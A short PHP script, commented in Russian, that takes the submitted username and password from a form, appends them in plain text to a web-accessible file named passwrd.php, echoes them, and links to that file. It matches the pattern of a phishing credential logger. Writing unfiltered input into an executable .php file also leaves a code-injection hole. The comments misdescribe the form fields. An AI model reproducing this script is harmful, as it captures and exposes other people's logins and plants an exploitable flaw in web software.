<?php
 
$usrname= $_POST['username']; // Здесь будет значение инпута с name атрибутом "value"
$passwd =  $_POST['password']; // А здесь с name "email"

$f = fopen('passwrd.php', 'a+'); // Открываем файл
fwrite($f, "User-password: ".$usrname." - ".$passwd."\n"); // Записываем данные
fclose($f); // Закрываем файл
echo "User-password: ".$usrname." - ".$passwd."\n";
echo "<a href='passwrd.php'>View</a>\n";
?>
